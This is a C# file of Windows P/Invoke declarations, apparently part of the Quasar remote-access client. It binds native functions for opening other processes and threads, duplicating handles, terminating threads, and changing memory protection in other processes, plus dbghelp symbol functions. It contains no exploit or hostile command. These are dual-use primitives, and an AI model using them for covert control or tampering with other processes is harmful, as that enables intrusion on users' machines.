using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Win32PE.Structs
{
    public static class NativeMethods
    {
        internal const int DBG_TERMINATE_THREAD = 0x40010003;
        private const int FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
        private static readonly StringBuilder m_sbSysMsg = new StringBuilder(1024);

        public static string FormatSystemMessage(int dwMessageId)
        {
            lock (m_sbSysMsg)
            {
                var ret = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM,
                                        IntPtr.Zero,
                                        dwMessageId,
                                        CultureInfo.CurrentCulture.LCID,
                                        m_sbSysMsg,
                                        m_sbSysMsg.Capacity - 1,
                                        IntPtr.Zero);

                if (ret > 0)
                    return m_sbSysMsg.ToString(0, ret);
                return null;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern SafeFileHandle CreateFile(string fileName,
                                                       [MarshalAs(UnmanagedType.U4)] NativeFileAccess fileAccess,
                                                       [MarshalAs(UnmanagedType.U4)] NativeFileShare fileShare,
                                                       IntPtr securityAttributes,
                                                       [MarshalAs(UnmanagedType.U4)] NativeFileMode creationDisposition,
                                                       NativeFileFlag flags,
                                                       IntPtr template);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        internal static extern bool DeviceIoControl(SafeHandle hDevice,
                                                  uint IoControlCode,
                                                  [MarshalAs(UnmanagedType.AsAny), In] object InBuffer,
                                                  int nInBufferSize,
                                                  IntPtr OutBuffer,
                                                  int nOutBufferSize,
                                                  out int pBytesReturned,
                                                  IntPtr pOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        internal static extern bool DeviceIoControl(SafeHandle hDevice,
                                                  uint IoControlCode,
                                                  [MarshalAs(UnmanagedType.AsAny), In] object InBuffer,
                                                  int nInBufferSize,
                                                  [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 6), Out] byte[] OutBuffer,
                                                  int nOutBufferSize,
                                                  out int pBytesReturned,
                                                  IntPtr Overlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, EntryPoint = "DeviceIoControl")]
        internal static extern bool DeviceIoControlAsObject(SafeHandle hDevice,
                                                          uint IoControlCode,
                                                          [MarshalAs(UnmanagedType.AsAny), In] object InBuffer,
                                                          int nInBufferSize,
                                                          [MarshalAs(UnmanagedType.AsAny), Out] object OutBuffer,
                                                          int nOutBufferSize,
                                                          ref int pBytesReturned,
                                                          IntPtr Overlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern int FormatMessage(int dwFlags,
                                                IntPtr lpSource,
                                                int dwMessageId,
                                                int dwLanguageId,
                                                [Out] StringBuilder lpBuffer,
                                                int nSize,
                                                IntPtr lpArguments);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        internal static extern bool GetOverlappedResult(SafeHandle hDevice, IntPtr lpOverlapped, out int lpNumberOfBytesTransferred, bool bWait);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32")]
        internal static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("ntdll.dll")]
        internal static extern IntPtr NtCurrentTeb();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        [DllImport("psapi.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern uint GetModuleFileNameEx(IntPtr hProcess,
            IntPtr hModule,
            [Out] StringBuilder lpBaseName,
            [In] [MarshalAs(UnmanagedType.U4)]
                    int nSize);

        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQuerySystemInformation(
            [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
            [In] IntPtr SystemInformation,
            [In] int SystemInformationLength,
            [Out] out int ReturnLength);

        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQueryInformationProcess(
            [In] IntPtr ProcessHandle,
            [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,
            [In] IntPtr ProcessInformation,
            [In] int ProcessInformationLength,
            [Out] out int ReturnLength);

        [DllImport("ntdll.dll")]
        internal static extern NT_STATUS NtQueryObject(
            [In] IntPtr Handle,
            [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,
            [In] IntPtr ObjectInformation,
            [In] int ObjectInformationLength,
            [Out] out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int GetThreadId(IntPtr threadHandle);

        [DllImport("kernel32.dll")]
        internal static extern uint GetCurrentThreadId();

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr OpenProcess(
            [In] ProcessAccessRights dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr OpenThread(
            [In] ThreadAccessRights dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] int dwProcessId);

        [DllImport("kernel32.dll")]
        internal static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool DuplicateHandle(
            [In] IntPtr hSourceProcessHandle,
            [In] IntPtr hSourceHandle,
            [In] IntPtr hTargetProcessHandle,
            [Out] out IntPtr lpTargetHandle,
            [In] int dwDesiredAccess,
            [In, MarshalAs(UnmanagedType.Bool)] bool bInheritHandle,
            [In] DuplicateHandleOptions dwOptions);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        internal static extern int GetCurrentProcessId();

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern int GetProcessId(
            [In] IntPtr Process);

        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CloseHandle([In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern int QueryDosDevice(
            [In] string lpDeviceName,
            [Out] StringBuilder lpTargetPath,
            [In] int ucchMax);

        public const int MAX_PATH = 260;

        [DllImport("kernel32.dll", SetLastError = true)]

        internal static extern void GetSystemInfo(ref SYSTEM_INFO Info);

        [DllImport("Dbghelp.dll", SetLastError = true)]
        internal static extern uint SymGetOptions();

        [DllImport("Dbghelp.dll", SetLastError = true)]
        internal static extern uint SymSetOptions(uint SymOptions);

        [DllImport("Dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern bool SymInitialize(IntPtr hProcess, string UserSearchPath, bool fInvadeProcess);

        [DllImport("Dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static unsafe extern ulong SymLoadModuleEx(IntPtr hProcess,
          IntPtr hFile,
          string ImageName,
          string ModuleName,
          long BaseOfDll,
          uint DllSize,
          _MODLOAD_DATA* Data,
          uint Flags);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi, BestFitMapping = false)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("Dbghelp.dll", SetLastError = true)]
        internal static unsafe extern bool SymGetModuleInfo64(IntPtr hProcess, ulong qwAddr, ref _IMAGEHLP_MODULE64 ModuleInfo);

        [DllImport("dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode, EntryPoint = "SymEnumSymbolsW")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool SymEnumSymbols(IntPtr hProcess,
                                                    ulong modBase,
                                                    string mask,
                                                    native_SYM_ENUMERATESYMBOLS_CALLBACK callback,
                                                    IntPtr pUserContext);

        [DllImport("dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode, EntryPoint = "SymEnumTypesW")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool SymEnumTypes(IntPtr hProcess, ulong BaseOfDll,
            native_SYM_ENUMERATESYMBOLS_CALLBACK callback, IntPtr UserContext);

        [return: MarshalAs(UnmanagedType.Bool)]
        internal delegate bool native_SYM_ENUMERATESYMBOLS_CALLBACK( /* SYMBOL_INFO* */ IntPtr symInfo,
                                                                                     uint symbolSize,
                                                                                     IntPtr pUserContext);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("dbghelp.dll", SetLastError = true, EntryPoint = "SymCleanup")]
        internal static extern bool SymCleanup(IntPtr hProcess);

        [DllImport("user32.dll")]
        internal static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, ref IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        internal static extern void OutputDebugString(string lpOutputString);

        [DllImport("kernel32.dll")]
        internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, PageAccessRights flNewProtect, out PageAccessRights lpflOldProtect);

        [DllImport("kernel32.dll")]
        internal static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
    }
}
